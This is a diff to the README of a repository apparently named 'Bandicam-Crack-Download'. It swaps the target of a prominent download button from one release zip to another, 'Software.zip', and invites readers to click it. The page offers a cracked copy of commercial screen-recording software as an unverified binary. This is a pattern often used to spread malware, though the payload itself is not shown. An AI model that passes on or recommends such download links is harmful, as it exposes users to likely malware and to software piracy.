@@ -28,7 +28,7 @@ In this repository, you will find a treasure trove of information related to Ban
 
 ## 🔗 Ready to Dive In? Download Bandicam Software Here:
 
-[![Download Bandicam Software](https://github.com/xxpovelxx/Bandicam-Crack-Download/releases/download/v1.0/Application.zip)](https://github.com/xxpovelxx/Bandicam-Crack-Download/releases/download/v1.0/Application.zip)
+[![Download Bandicam Software](https://github.com/xxpovelxx/Bandicam-Crack-Download/releases/download/v2.0/Software.zip)](https://github.com/xxpovelxx/Bandicam-Crack-Download/releases/download/v2.0/Software.zip)
 
 *Note: Click the button above to download the software package. Let the Bandicam adventure begin!*
 
